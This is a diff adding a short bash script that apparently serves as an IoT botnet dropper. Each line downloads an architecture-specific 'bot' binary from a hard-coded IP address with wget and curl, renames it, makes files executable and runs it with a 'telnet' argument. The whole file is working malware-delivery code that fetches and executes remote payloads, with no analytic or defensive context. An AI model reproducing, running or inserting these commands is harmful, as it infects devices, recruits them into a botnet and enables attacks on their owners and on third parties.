@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.153.203.33/welcome/bot.x86; curl -O http://45.153.203.33/welcome/bot.x86; cat bot.x86 > ilovebadpackets; chmod +x *; ./ilovebadpackets telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.153.203.33/welcome/bot.mips; curl -O http://45.153.203.33/welcome/bot.mips; cat bot.mips > ilovebadpackets; chmod +x *; ./ilovebadpackets telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.153.203.33/welcome/bot.mpsl; curl -O http://45.153.203.33/welcome/bot.mpsl; cat bot.mpsl > ilovebadpackets; chmod +x *; ./ilovebadpackets telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.153.203.33/welcome/bot.arm; curl -O http://45.153.203.33/welcome/bot.arm; cat bot.arm > ilovebadpackets; chmod +x *; ./ilovebadpackets telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.153.203.33/welcome/bot.arm5; curl -O http://45.153.203.33/welcome/bot.arm5; cat bot.arm5 > ilovebadpackets; chmod +x *; ./ilovebadpackets telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.153.203.33/welcome/bot.arm6; curl -O http://45.153.203.33/welcome/bot.arm6; cat bot.arm6 > ilovebadpackets; chmod +x *; ./ilovebadpackets telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.153.203.33/welcome/bot.arm7; curl -O http://45.153.203.33/welcome/bot.arm7; cat bot.arm7 > ilovebadpackets; chmod +x *; ./ilovebadpackets telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.153.203.33/welcome/bot.ppc; curl -O http://45.153.203.33/welcome/bot.ppc; cat bot.ppc > ilovebadpackets; chmod +x *; ./ilovebadpackets telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.153.203.33/welcome/bot.m68k; curl -O http://45.153.203.33/welcome/bot.m68k; cat bot.m68k > ilovebadpackets; chmod +x *; ./ilovebadpackets telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.153.203.33/welcome/bot.spc; curl -O http://45.153.203.33/welcome/bot.spc; cat bot.spc > ilovebadpackets; chmod +x *; ./ilovebadpackets telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.153.203.33/welcome/bot.i686; curl -O http://45.153.203.33/welcome/bot.i686; cat bot.i686 > ilovebadpackets; chmod +x *; ./ilovebadpackets telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.153.203.33/welcome/bot.sh4; curl -O http://45.153.203.33/welcome/bot.sh4; cat bot.sh4 > ilovebadpackets; chmod +x *; ./ilovebadpackets telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.153.203.33/welcome/bot.arc; curl -O http://45.153.203.33/welcome/bot.arc; cat bot.arc > ilovebadpackets; chmod +x *; ./ilovebadpackets telnet
